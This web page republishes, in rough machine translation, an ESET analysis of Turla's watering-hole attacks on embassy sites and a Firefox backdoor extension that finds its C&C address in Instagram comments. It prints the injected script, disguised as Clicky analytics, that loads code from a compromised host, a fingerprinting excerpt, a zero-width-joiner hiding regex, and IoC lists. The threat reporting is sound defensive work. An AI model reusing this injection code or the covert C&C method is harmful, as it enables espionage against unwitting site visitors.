<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Turla's cybercamping: updated Firefox extension uses Instagram</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Some schemes of ART attacks do not change over the years. For example, attacks watering hole in the performance of cybergroup Turla. This grouping spe...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Turla's cybercamping: updated Firefox extension uses Instagram</h1><div class="post__text post__text-html js-mediator-article">  Some schemes of ART attacks do not change over the years.  For example, attacks watering hole in the performance of cybergroup Turla.  This grouping specializes in cyber espionage, its main goals are government and diplomatic institutions.  Hackers have been using the watering hole scheme to redirect potential victims to their C &amp; C infrastructure since at least 2014, sometimes making small changes in how they work. <br><br><img src="https://habrastorage.org/web/648/c42/00c/648c4200c14240b7a4669349b3ca427b.jpg"><br><br>  We at ESET have been following the Turla campaigns and have recently discovered that hackers have returned to using the method abandoned for several months. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <a name="habracut"></a><h3>  The initial stages of compromise </h3><br>  Below in the section with infection indicators there is a list of sites that Turla used in the watering hole attacks in the past.  What is <a href="https://blogs.forcepoint.com/security-labs/curious-case-reconnaissance-campaign-targeting-ministry-and-embassy-sites">characteristic of</a> this grouping, there are many sites in the list related to embassies of different countries. <br><br>  Redirects are done thanks to a snippet of code that hackers add to the original page.  The scripts we discovered in the last few months are as follows: <br><br><pre><code class="javascript hljs">&lt;!-- Clicky Web Analytics (start) --&gt; <span class="xml"><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag"> </span></span><span class="hljs-attr"><span class="xml"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span></span><span class="xml"><span class="hljs-tag">=</span></span><span class="hljs-string"><span class="xml"><span class="hljs-tag"><span class="hljs-string">"text/javascript"</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span><span class="xml"><span class="xml"><span class="xml">// &lt;![CDATA[ var clicky_site_ids = clicky_site_ids || []; clicky_site_ids.push(100673048); (function() { var s = document.createElement('script'); var a = 'http://www.mentalhealthcheck.net/'; var b = 'update/counter.js'; s.type = 'text/javascript'; s.async = true; s.src = '//static.getclicky.com/js'; s.src = a.concat(b); ( document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(s); })(); // ]]&gt;</span></span></span><span class="hljs-tag"><span class="xml"><span class="hljs-tag">&lt;/</span></span><span class="hljs-name"><span class="xml"><span class="hljs-tag"><span class="hljs-name">script</span></span></span></span><span class="xml"><span class="hljs-tag">&gt;</span></span></span></span></code> </pre> <br>  It is noteworthy that hackers added a link to Clicky, a web analytics application.  Probably in this way they create the appearance of legitimacy of the script for a non-expert, although the application itself is not used in the attack. <br><br>  The added script calls another script at <code>mentalhealthcheck.net/update/counter.js</code> .  This server is used by Turla hackers to send victims of digital fingerprint scripts that collect information about the system they are running on.  The link to the Google Analytics script was used in a similar way, but lately we see Clicky more often.  In the section with infection indicators you will find a list of C &amp; C servers that we have discovered in recent months.  These are originally legitimate servers that have been infected. <br><br>  The next stage is the delivery of JavaScript digital fingerprints to potential victims.  For this, the C &amp; C server filters visitors by IP addresses.  If the visitor is in the range of target IP addresses, he will receive a digital fingerprint script, if not, a harmless script.  Below is an excerpt from the script that target users receive: <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">cb_custom</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ loadScript(<span class="hljs-string"><span class="hljs-string">"http://www.mentalhealthcheck.net/script/pde.js"</span></span>, cb_custom1); } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">cb_custom1</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ PluginDetect.getVersion(<span class="hljs-string"><span class="hljs-string">'.'</span></span>); myResults[<span class="hljs-string"><span class="hljs-string">'Java'</span></span>]=PluginDetect.getVersion(<span class="hljs-string"><span class="hljs-string">'Java'</span></span>); myResults[<span class="hljs-string"><span class="hljs-string">'Flash'</span></span>]=PluginDetect.getVersion(<span class="hljs-string"><span class="hljs-string">'Flash'</span></span>); myResults[<span class="hljs-string"><span class="hljs-string">'Shockwave'</span></span>]=PluginDetect.getVersion(<span class="hljs-string"><span class="hljs-string">'Shockwave'</span></span>); myResults[<span class="hljs-string"><span class="hljs-string">'AdobeReader'</span></span>]=PluginDetect.getVersion(<span class="hljs-string"><span class="hljs-string">'AdobeReader'</span></span>) || PluginDetect.getVersion(<span class="hljs-string"><span class="hljs-string">'PDFReader'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ec = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> evercookie(); ec.get(<span class="hljs-string"><span class="hljs-string">'thread'</span></span>, getCookie)</code> </pre> <br>  The script downloads a JS library called <code>PluginDetect</code> , which can collect information about plugins installed in the browser.  Then the collected information is sent to the C &amp; C server. <br><br>  In addition, the script tries to install evercookie, which will track the user's activity in the browser for all sites. <br><br>  For those familiar with Turla‚Äôs watering hole attacks, it‚Äôs obvious that hackers continue to use proven methods. <br><br><h3>  Firefox extension </h3><br>  Probably, some people remember <a href="http://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender-Whitepaper-PAC-A4-en_EN1.pdf">the Pacifier APT report</a> describing a targeted phishing attack using a malicious Word document that was sent to agencies all over the world.  Next, the backdoor was loaded into the system, and now we know that we are talking about Skipper, the backdoor of the first stage of the Turla group. <br><br>  The report also describes an extension for Firefox that is downloaded by the same type of malicious document.  And, it seems, we found a new version of this extension.  This is a JavaScript backdoor, different in implementation from what is described in the Pacifier APT report, but with similar functionality. <br><br><img src="https://habrastorage.org/web/466/7d2/76b/4667d276bf824f4fb3d2c19190cc97ad.png"><br><br>  The malicious HTML5 Encoding extension spread through the compromised website of a Swiss company.  This is a simple backdoor, which, however, differs in an interesting way to access the C &amp; C server. <br><br><h3>  Instagram use </h3><br>  HTML5 Encoding uses the short URL bit.ly to access the C &amp; C server, but the URL in its code is missing.  The extension gets the address from the comments on certain Instagram posts.  In our example, it was a comment to the photo of Britney Spears in the official account. <br><br><img src="https://habrastorage.org/web/2a6/3df/8d9/2a63df8d98374694852ef6da2184d93f.png"><br>  <a href="https://www.instagram.com/p/BO8gU41A45g/">www.instagram.com/p/BO8gU41A45g</a> <br><br>  The extension examines each comment on a photo and calculates an individual hash value.  If the value matches the number 183, the extension will execute the regular expression to get the URL bit.ly: <br><br> <code>(?:\\u200d(?:#|@)(\\w)</code> <br> <br>  In the comments to the photo there was only one with a hash sum of 183 - of February 6, while the photo was posted in early January.  Taking a comment and passing it through regex, we get the following link bit.ly: <a href="http://bit.ly/2kdhuHX">bit.ly/2kdhuHX</a> <br><br>  When we study the regular expression in detail, we see that it is looking for either <code>@|#</code> or Unicode-character <code>\200d</code> - an invisible character Zero Width Joiner, a zero-width joining machine, which is usually used to separate emoji.  By copying a comment or examining its source, you can see the Zero Width Joiner before each character in the address bar: <br><br> <code>smith2155&lt;200d&gt;#2hot ma&lt;200d&gt;ke lovei&lt;200d&gt;d to &lt;200d&gt;her, &lt;200d&gt;uupss &lt;200d&gt;#Hot &lt;200d&gt;#X</code> <br> <br>  When you click on the short link, we get to <code>static.travelclothes.org/dolR_1ert.php</code> .  This address was used in past attacks by the Turla group watering hole. <br><br>  For the bit.ly link, you can get conversion statistics: <br><br><img src="https://habrastorage.org/web/e96/8ee/839/e968ee839c064585a4e78c42bd6751ba.png"><br><br>  In February, only 17 transitions were recorded, which roughly coincide with the publication of the commentary.  A small number of transitions may indicate a test character attacks. <br><br><h3>  Technical analysis </h3><br>  The extension for Firefox serves as a simple backdoor.  It collects information about the system and sends this data, encrypted with AES, to the C &amp; C server.  Similar to the description of the extension described in the Pacifier APT report. <br><br>  The backdoor component can run four different types of commands: <br><br><ul><li>  Execute arbitrary file </li><li>  Upload file to C &amp; C server </li><li>  Download file from C &amp; C server </li><li>  Read the contents of a directory - send a list of files with sizes and dates to a C &amp; C server </li></ul><br>  According to our estimates, the attacks are still being conducted in test mode.  The next version of the extension, if it ever appears, will be significantly different from the current one.  There are several APIs used by the extension that will disappear in future versions of Firefox.  They can only be used as add-ons, because their place since Firefox 57 will be taken by WebExtensions.  Starting from this version and above, Firefox will no longer download add-ons, which precludes the use of these APIs. <br><br><h3>  Conclusion </h3><br>  The fact of using social networks to get the address of the C &amp; C server is quite remarkable.  In addition to Turla, this approach is used by other groups, including <a href="https://habrahabr.ru/company/eset/blog/223995/">Dukes</a> . <br><br>  Using social networks is an additional challenge to build protection.  First, the traffic from social networks associated with the activities of intruders, it is difficult to distinguish from the legitimate.  Secondly, the method provides hackers with greater flexibility - you can easily change the addresses of C &amp; C servers and remove their traces. <br><br>  It is interesting to see how Turla hackers are again using the old method of using digital fingerprints, as well as looking for new ways to complicate the detection of C &amp; C servers. <br><br>  <i>You can ask additional questions to researchers or submit malware samples related to the activities of the Turla group by emailing threatintel@eset.com.</i> <i><br></i>  <i>Thanks to Clement Lecigne of Google's Threat Analysis Group for research assistance.</i> <br><br><h3>  Infection Indicators (IoCs) </h3><br>  Firefox extension hash: <br><br> <code>html5.xpi 5ba7532b4c89cc3f7ffe15b6c0e5df82a34c22ea <br> html5.xpi 8e6c9e4582d18dd75162bcbc63e933db344c5680</code> <br> <br>  Compromised sites redirecting to digital fingerprint servers (at the time of writing this report were either legitimate or led to non-operational servers): <br><br> <code>hxxp://www.namibianembassyusa.org <br> hxxp://www.avsa.org <br> hxxp://www.zambiaembassy.org <br> hxxp://russianembassy.org <br> hxxp://au.int <br> hxxp://mfa.gov.kg <br> hxxp://mfa.uz <br> hxxp://www.adesyd.es <br> hxxp://www.bewusstkaufen.at <br> hxxp://www.cifga.es <br> hxxp://www.jse.org <br> hxxp://www.embassyofindonesia.org <br> hxxp://www.mischendorf.at <br> hxxp://www.vfreiheitliche.at <br> hxxp://www.xeneticafontao.com <br> hxxp://iraqiembassy.us <br> hxxp://sai.gov.ua <br> hxxp://www.mfa.gov.md <br> hxxp://mkk.gov.kg</code> <br> <br>  Compromised sites used as C &amp; C servers of the first stage in the watering hole campaign: <br><br> <code>hxxp://www.mentalhealthcheck.net/update/counter.js (hxxp://bitly.com/2hlv91v+) <br> hxxp://www.mentalhealthcheck.net/script/pde.js <br> hxxp://drivers.epsoncorp.com/plugin/analytics/counter.js <br> hxxp://rss.nbcpost.com/news/today/content.php <br> hxxp://static.travelclothes.org/main.js <br> hxxp://msgcollection.com/templates/nivoslider/loading.php <br> hxxp://versal.media/?atis=509 <br> hxxp://www.ajepcoin.com/UserFiles/File/init.php (hxxp://bit.ly/2h8Lztj+) <br> hxxp://loveandlight.aws3.net/wp-includes/theme-compat/akismet.php <br> hxxp://alessandrosl.com/core/modules/mailer/mailer.php</code> </div><p>Source: <a href="https://habr.com/ru/post/330446/">https://habr.com/ru/post/330446/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../330432/index.html">Interview with Josh Patridge (Shazam) about marketing, business, strategy and new products</a></li>
<li><a href="../330434/index.html">Cheap full flash - fiction or reality?</a></li>
<li><a href="../330438/index.html">Polybius Bank: the most significant event of the year in the world of cryptocurrency</a></li>
<li><a href="../330440/index.html">Virtualization opportunities for IT savings</a></li>
<li><a href="../330444/index.html">Effective technical support tools</a></li>
<li><a href="../330448/index.html">Designer's blood, sweat and tears</a></li>
<li><a href="../330450/index.html">UltraVNC as a replacement for TeamViewer</a></li>
<li><a href="../330452/index.html">When docker-compose is missing</a></li>
<li><a href="../330454/index.html">10 rules for the organization of effective customer support</a></li>
<li><a href="../330456/index.html">Ecosystem: more participants - more profit! Why does Skyeng open API</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>